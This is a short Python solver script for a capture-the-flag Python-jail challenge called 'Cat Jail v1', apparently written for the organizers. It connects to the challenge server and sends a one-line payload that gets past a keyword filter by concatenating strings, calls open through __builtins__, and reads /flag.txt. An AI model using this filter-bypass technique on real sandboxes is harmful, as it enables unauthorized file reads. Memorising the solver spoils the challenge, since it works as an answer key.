#!/usr/bin/env python3
"""
Cat Jail v1 - solver (organizers only, do NOT ship to players).

Usage:
    python3 solve.py [host] [port]      # default localhost 1337
"""
import re
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

# The filter checks the text we type; the forbidden words only exist after Python builds them.
PAYLOAD = "__builtins__.__dict__['op'+'en']('/fl'+'ag.txt').read()"

with socket.create_connection((HOST, PORT), timeout=10) as s:
    data = b""
    while b">>> " not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    s.sendall(PAYLOAD.encode() + b"\n")
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk

text = data.decode(errors="replace")
m = re.search(r"SecurinetsENIT\{[^}]*\}", text)
print(m.group(0) if m else text)
